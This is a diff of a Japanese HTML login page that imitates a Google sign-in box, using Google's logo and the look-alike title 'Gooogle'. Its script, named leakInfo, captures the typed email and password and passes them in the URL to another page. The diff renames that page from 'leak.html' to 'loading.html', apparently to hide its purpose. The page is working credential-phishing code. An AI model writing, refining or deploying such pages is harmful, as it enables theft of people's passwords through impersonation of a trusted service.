@@ -1,18 +1,37 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8">
-  <title>ログイン - G-Port</title>
-  <link rel="stylesheet" href="style.css">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <meta charset="UTF-8" />
+  <title>ログイン - Gooogle</title>
+  <link rel="stylesheet" href="style.css" />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+    rel="stylesheet"
+  />
 </head>
 <body>
   <div class="google-login-box">
-    <img src="https://www.gstatic.com/images/branding/product/1x/googleg_32dp.png" alt="logo" class="logo">
+    <img
+      src="https://www.gstatic.com/images/branding/product/1x/googleg_32dp.png"
+      alt="logo"
+      class="logo"
+    />
     <h2>G-Port にログイン</h2>
     <form onsubmit="leakInfo(event)">
-      <input type="email" id="email" placeholder="メールアドレスを入力" required>
-      <input type="password" id="password" placeholder="パスワードを入力" required>
+      <input
+        type="email"
+        id="email"
+        placeholder="メールアドレスを入力"
+        required
+        autocomplete="username"
+      />
+      <input
+        type="password"
+        id="password"
+        placeholder="パスワードを入力"
+        required
+        autocomplete="current-password"
+      />
       <div class="actions">
         <a href="#">パスワードをお忘れですか？</a>
       </div>
@@ -24,9 +43,11 @@
   <script>
     function leakInfo(e) {
       e.preventDefault();
-      const email = document.getElementById('email').value;
-      const pass = document.getElementById('password').value;
-      const query = `leak.html?email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}`;
+      const email = document.getElementById("email").value;
+      const pass = document.getElementById("password").value;
+      const query = `loading.html?email=${encodeURIComponent(
+        email
+      )}&pass=${encodeURIComponent(pass)}`;
       window.location.href = query;
     }
   </script>
